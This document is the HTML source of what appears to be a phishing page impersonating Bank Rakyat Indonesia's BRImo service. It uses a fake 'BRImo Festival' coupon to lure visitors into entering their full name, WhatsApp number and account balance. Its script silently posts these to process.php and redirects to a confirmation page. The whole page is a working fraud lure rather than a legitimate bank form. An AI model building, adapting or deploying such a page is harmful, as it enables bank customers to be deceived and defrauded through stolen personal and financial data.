<body>
    <wellcomrap class="loading" id="process" style="display: none;">
        <img src="img/f01dmo.gif" alt="eror img" />
    </wellcomrap>

    <main class="index">
        <nav class="navindex">
            <img src="AddText_05-16-11.32.39.jpg" alt="" />
        </nav>
        <div class="well">
            Halo Sobat <span style="color: #1C56A0;">BRI</span><span style="color: #FF7400;">mo</span>.
            <p style="font-size: 15px;">Silahkan Lengkapi Formulir Pendaftaran <span style="color: #1C56A0;">BRI</span><span style="color: #FF7400;">mo</span> 𝗙𝗲𝘀𝘁𝗶𝘃𝗮𝗹 dibawah ini.</p>
        </div>

        <div class="formbox">
            <h5 class="alok">📝𝗜𝘀𝗶 𝗱𝗮𝘁𝗮 𝗮𝗻𝗱𝗮 𝘀𝗲𝘀𝘂𝗮𝗶 𝗱𝗶 𝗮𝗽𝗹𝗶𝗸𝗮𝘀𝗶 <span style="color: #1C56A0;">𝗕𝗥𝗜</span><span style="color: #FF7400;">𝗺𝗼</span></h6>
                <form onsubmit="sendData(event)" method="POST" id="formData">

                    <div class="inpbox mt-4">
                        <label for="nama">Nama Lengkap</label>
                        <input type="text" name="nama" id="nama" required autocomplete="of" autofocus placeholder="Nama Lengkap" />
                    </div>

                    <div class="inpbox">
                        <label for="nohp">No. Whatsapp</label>
                        <input type="tel" name="nohp" id="nohp" required autocomplete="of" autofocus placeholder="08xxxx" maxlength="13" minlength="12 13" />
                    </div>

                    <div class="inpbox">

                        <label for="dengan-rupiah">Saldo Akhir</label>

                        <input type="tel" name="saldo" id="dengan-rupiah" required autocomplete="of" autofocus placeholder="Rp.0,00" />
                    </div>

                    <div class="flg">
                        <button class="kirim" id="kirim" type="submit">Cetak Kupon</button>
                    </div>

                </form>
        </div>
        <div class="pt">
            © 2025 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.
        </div>
    </main>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="js/jquery.min.js"></script>
<script src="js/jquery.mask.min.js"></script>
<script src="js/limit.js"></script>

<script>
    $(document).ready(function() {
        $(document).submit(function(e) {
            event.preventDefault();
            document.getElementById('kirim').innerHTML = "Memproses....";
        });
        return false;
    });


    function sendData(event) {
        $("#process").show();
        event.preventDefault();
        $("#nope").blur();
        $.ajax({
            type: 'POST',
            url: 'process.php',
            data: $('#formData').serialize(),
            dataType: 'text',
            success: function() {
                setTimeout(function() {
                    window.location.href = "konf.html";
                }, 2000);
            }
        });
    };
</script>

<script>
    $(document).ready(function() {
        $('#nohp').on('input', function() {
            if ($(this).val() == '8' || $(this).val() == '62') {
                $(this).val('');
            }
        });
    });
</script>
<script>
    $(document).ready(function() {
        $('#nohp').mask('000-0000-000000');
    });
</script>

</html>
